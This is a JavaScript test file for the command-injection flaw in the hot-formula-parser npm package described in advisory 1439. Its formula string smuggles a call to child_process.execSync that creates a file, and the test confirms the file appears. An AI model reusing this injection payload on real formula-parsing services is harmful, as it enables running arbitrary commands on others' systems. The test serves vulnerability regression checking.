//https://www.npmjs.com/advisories/1439
test("Command Injection in hot-formula-parser", () => {
  const FormulaParser = require("hot-formula-parser").Parser;
  const fs = require("fs");
  const path = "./hot-formula-parser";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let parser = new FormulaParser();
  parser.parse(
    "SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])"
  );

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
